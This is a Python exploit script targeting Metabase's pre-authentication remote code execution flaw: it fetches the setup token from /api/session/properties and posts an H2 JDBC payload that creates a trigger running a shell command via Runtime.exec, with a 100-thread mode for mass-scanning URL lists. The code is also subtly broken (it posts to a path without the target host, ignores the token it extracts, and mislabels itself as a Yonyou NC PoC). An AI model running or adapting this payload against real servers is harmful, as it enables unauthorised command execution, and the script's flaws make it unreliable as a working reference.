import requests,sys,argparse,json,re,time,os
from multiprocessing.dummy import Pool
from requests.packages import urllib3
urllib3.disable_warnings()
def banner():
    text="""       ____.__            ____.__        
    |    |__| ____     |    |__| ____  
    |    |  |/ __ \    |    |  |/ __ \ 
/\__|    |  \  ___//\__|    |  \  ___/ 
\________|__|\___  >________|__|\___  >
                 \/                 \/ 

     
writer:杰杰宝贝
"""
    print(text)
def main():
    banner()
    parser = argparse.ArgumentParser(description='用友NC_poc')
    parser.add_argument('-u','--url',dest='url',type=str,help="your one url")
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file name ')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url) 
    elif args.file and not args.url:
        urllist = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                urllist.append(url.strip())
        mp = Pool(100)
        mp.map(poc,urllist)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    api_payload = "/api/session/properties"
    api_payload1 = "/api/setup/validate"
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:128.0)Gecko/20100101Firefox/128.0',
    }
    headers1 = {
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:128.0)Gecko/20100101Firefox/128.0',
        'Content-Type':'application/json',
        'Content-Length':'748'
    }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res1 = requests.get(url=target+api_payload,headers=headers,verify=False,timeout=15,proxies=proxies)
        # print(res1.text)
        match = re.search(r'"setup-token":"(.*?)"',res1.text)
        # print(match)
        res2 = match.group(0).split(':')
        print(res2[1])
        json_str = '''
        {
            "token": "8f088a94-5c5e-4544-8cbd-62794112fcd7",
            "details":
            {
                "is_on_demand": false,
                "is_full_sync": false,
                "is_sample": false,
                "cache_ttl": null,
                "refingerprint": false,
                "auto_run_queries": true,
                "schedules": {},
                "details":
                {
                    "db": "zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('id')\n$$--=x",
                    "advanced-options": false,
                    "ssl": true
                },
                "name": "an-sec-research-team",
                "engine": "h2"
            }
        }
        '''
        data = json.loads(json_str)
        res3 = requests.post(url=api_payload1,headers=headers1,data=data,proxies=proxies)
        print(res3.text)
    except:
        pass
def exp(target):
    pass


if __name__ == '__main__':
    main()